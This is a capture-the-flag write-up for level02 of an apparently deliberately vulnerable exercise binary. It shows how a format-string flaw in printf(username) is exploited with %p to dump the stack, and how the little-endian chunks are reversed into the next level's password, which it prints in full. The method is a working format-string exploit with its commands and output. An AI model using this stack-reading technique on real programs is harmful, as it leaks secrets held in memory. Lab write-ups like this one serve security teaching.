### Download binary
``scp -P4242 level02@192.168.31.33:/home/users/level02/level02 ~/Bureau/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

---

### Main function analysis (refer to source code)

By analyzing the source code we see that the program store the content of the flag in the stack. We will then try to read the content of the stack. Our way to read the stack is to use a format string attack on this printf :

 `printf(username);`

By using the specificier '%p' rather than a username we will be able to read the stack. We also know that the password is 40 character long with this line of code :

 `bytes_read = fread(flag, 1, 41, file);`

**(40 char + 1 '\0')**

We made a little bash script **find_flag.sh** to print all the value present on the stack. We then just have to launch the script and we get this output :

``chmod +x find_flag.sh``

``level02@OverRide:/tmp$ ./find_flag.sh``
>1 - 0x7fffffffe0d0 does not have access!      // non printable / adress
>[...nil...]
>4 - 0x2a2a2a2a2a2a2a2a does not have access!  // ********
>5 - 0x2a2a2a2a2a2a2a2a does not have access!  // ********
>6 - 0x7fffffffe2c8 does not have access!      // non printable / adress
>7 - 0x1f7ff9a08 does not have access!         // non printable
>[...nil...]
>20 - 0x100000000 does not have access!        // non printable
>[...nil...]
>22 - 0x756e505234376848 does not have access! // unPR47hH -> Hh74RPnu | **H**
>23 - 0x45414a3561733951 does not have access! // EAJ5as9Q -> Q9sa5JAE | **E**
>24 - 0x377a7143574e6758 does not have access! // 7zqCWNgX -> XgNWCqz7 | **R**
>25 - 0x354a35686e475873 does not have access! // 5J5hnGXs -> sXGnh5J5 | **E**
>26 - 0x48336750664b394d does not have access! // H3gPfK9M -> M9KfPg3H | **!**
>[...nil...]
>28 - 0x383225202d203832 does not have access! // 82% - 82 -> 28 - %28 |

We see that there is a bunch of character that could look like a flag. We must reverse the character that we got because it is wrote in little endian.

After appending all piece of flag we get :
`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

----

### Bypassing security

``level02@OverRide:~$ su level03``
``Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H``
>
>RELRO           STACK CANARY      NX            PIE             RPATH
>RUNPATH      FILE
>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No >RUNPATH
